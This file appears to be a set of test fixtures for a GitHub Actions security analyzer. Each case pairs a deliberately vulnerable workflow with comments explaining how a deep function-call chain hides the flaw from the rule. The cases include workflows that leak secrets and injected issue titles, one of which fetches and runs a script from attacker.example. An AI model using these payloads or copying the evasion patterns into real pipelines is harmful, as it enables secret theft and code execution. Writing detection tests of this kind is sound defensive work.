# situation: on issues, a step passes the issue's title in the environment
#   variable HOST, defines a function w that sets HOST to a fixed host when
#   SAFE_MODE is set (the step does not set SAFE_MODE),
#   runs a chain of functions f0 to f13 in which each function calls the
#   function before it twice (16,383 calls), calls w, and sends a request
#   with curl and the secret DEPLOY_TOKEN to HOST.
# reason: the call of w comes after the 4,096 calls of functions that the
#   rule follows, so the rule does not read the body of w, and does not
#   decide whether HOST holds the title of the issue when curl runs.
# attack: the attacker opens an issue titled attacker.example, the host of a
#   server the attacker runs.
# attack-run-behavior: w sets nothing, and curl sends the request with
#   Authorization: Bearer and the value of DEPLOY_TOKEN to attacker.example,
#   and the server of the attacker logs the header.
on: issues
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
    steps:
      - env:
          HOST: ${{ github.event.issue.title }}
        run: |
          w() { if [ -n "$SAFE_MODE" ]; then HOST=api.example.com; fi; }
          f0() { :; }
          f1() { f0; f0; }
          f2() { f1; f1; }
          f3() { f2; f2; }
          f4() { f3; f3; }
          f5() { f4; f4; }
          f6() { f5; f5; }
          f7() { f6; f6; }
          f8() { f7; f7; }
          f9() { f8; f8; }
          f10() { f9; f9; }
          f11() { f10; f10; }
          f12() { f11; f11; }
          f13() { f12; f12; }
          f13
          w
          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$HOST/status"

# situation: on push, a step defines a function w that sets key to the
#   secret API_KEY,
#   runs a chain of functions f0 to f13 in which each function calls the
#   function before it twice (16,383 calls), calls w, and sends key to
#   hooks.example.com with curl.
# reason: the call of w comes after the 4,096 calls of functions that the
#   rule follows when it reads what the commands of the step print, so the
#   rule does not read the body of w for the prints and reports an
#   Inconclusive at the call of w; the rule still reads the value that w
#   assigns, and also reports the request that carries the secret.
# attack: the attacker takes over the server of the destination, by a breach
#   of the vendor or by registering the domain when the domain lapses.
# attack-run-behavior: curl sends the secret to hooks.example.com, whose
#   server, now the attacker's, logs the secret.
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          w() { key="$API_KEY"; }
          f0() { :; }
          f1() { f0; f0; }
          f2() { f1; f1; }
          f3() { f2; f2; }
          f4() { f3; f3; }
          f5() { f4; f4; }
          f6() { f5; f5; }
          f7() { f6; f6; }
          f8() { f7; f7; }
          f9() { f8; f8; }
          f10() { f9; f9; }
          f11() { f10; f10; }
          f12() { f11; f11; }
          f13() { f12; f12; }
          f13
          w
          curl -fsS -H "x-apikey: $key" https://hooks.example.com/

# situation: on push, in a public repository (repo.public true), a step
#   defines a function w that sets PRIVATE_KEY to the private key out of the
#   secret GCP_SA_KEY, runs a chain of functions f0 to f13 in which each
#   function calls the function before it twice (16,383 calls), calls w, and
#   prints PRIVATE_KEY.
# reason: the call of w comes after the 4,096 calls of functions that the
#   rule follows when it reads what the commands of the step print, so the
#   rule does not read the body of w for the prints and reports an
#   Inconclusive at the call of w; the rule still reads the value that w
#   assigns, and also reports the print of the private key.
# attack: anyone signed in to GitHub opens the run's log and reads the
#   private key.
# attack-run-behavior: the step prints "key:" and the private key.
on: push
permissions: {}
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - env:
          GCP_SA_KEY: ${{ secrets.GCP_SA_KEY }}
        run: |
          w() { PRIVATE_KEY="$(echo "$GCP_SA_KEY" | jq -r '.private_key')"; }
          f0() { :; }
          f1() { f0; f0; }
          f2() { f1; f1; }
          f3() { f2; f2; }
          f4() { f3; f3; }
          f5() { f4; f4; }
          f6() { f5; f5; }
          f7() { f6; f6; }
          f8() { f7; f7; }
          f9() { f8; f8; }
          f10() { f9; f9; }
          f11() { f10; f10; }
          f12() { f11; f11; }
          f13() { f12; f12; }
          f13
          w
          echo "key: $PRIVATE_KEY"

# situation: on issues, the step p passes the title of the issue in the
#   environment variable TITLE, defines a function w that sets TITLE to a
#   fixed word when SAFE_MODE is set (the step does not set SAFE_MODE),
#   runs a chain of functions f0 to f13 in which each function calls the
#   function before it twice (16,383 calls), calls w, and
#   prints TITLE; the release step writes the output tag of the step p into
#   its script.
# reason: the call of w comes after the 4,096 calls of functions that the
#   rule follows, so the rule does not read the body of w, and does not
#   decide whether TITLE holds the title of the issue when echo runs.
# attack: the attacker opens an issue titled x ##[set-output
#   name=tag;]$(id).
# attack-run-behavior: w sets nothing, the step prints the title, the
#   runner sets the output tag of the step to $(id), and the release step
#   writes the output into its script and runs id, with the token and the
#   secrets of the job.
on: issues
permissions: {}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - id: p
        env:
          TITLE: ${{ github.event.issue.title }}
        run: |
          w() { if [ -n "$SAFE_MODE" ]; then TITLE=safe; fi; }
          f0() { :; }
          f1() { f0; f0; }
          f2() { f1; f1; }
          f3() { f2; f2; }
          f4() { f3; f3; }
          f5() { f4; f4; }
          f6() { f5; f5; }
          f7() { f6; f6; }
          f8() { f7; f7; }
          f9() { f8; f8; }
          f10() { f9; f9; }
          f11() { f10; f10; }
          f12() { f11; f11; }
          f13() { f12; f12; }
          f13
          w
          echo "issue: $TITLE"
      - run: ./release.sh "${{ steps.p.outputs.tag }}"

# situation: on issues, a job sets ACTIONS_ALLOW_UNSECURE_COMMANDS to true
#   in its env; a step passes the title of the issue in the environment
#   variable T, defines a function w that sets T to a fixed word when
#   SAFE_MODE is set (the step does not set SAFE_MODE),
#   runs a chain of functions f0 to f13 in which each function calls the
#   function before it twice (16,383 calls), calls w, and prints T; a step
#   comes after.
# reason: the call of w comes after the 4,096 calls of functions that the
#   rule follows, so the rule does not read the body of w, and does not
#   decide whether T holds the title of the issue when echo runs.
# attack: the attacker opens an issue titled ##[set-env
#   name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
# attack-run-behavior: w sets nothing, the step prints the title, the
#   runner sets BASH_ENV, and the bash of the next step runs the attacker's
#   script with the token and the secrets of the job.
on: issues
permissions: {}
jobs:
  j:
    runs-on: ubuntu-latest
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
    steps:
      - env:
          T: ${{ github.event.issue.title }}
        run: |
          w() { if [ -n "$SAFE_MODE" ]; then T=safe; fi; }
          f0() { :; }
          f1() { f0; f0; }
          f2() { f1; f1; }
          f3() { f2; f2; }
          f4() { f3; f3; }
          f5() { f4; f4; }
          f6() { f5; f5; }
          f7() { f6; f6; }
          f8() { f7; f7; }
          f9() { f8; f8; }
          f10() { f9; f9; }
          f11() { f10; f10; }
          f12() { f11; f11; }
          f13() { f12; f12; }
          f13
          w
          echo "issue: $T"
      - run: echo next

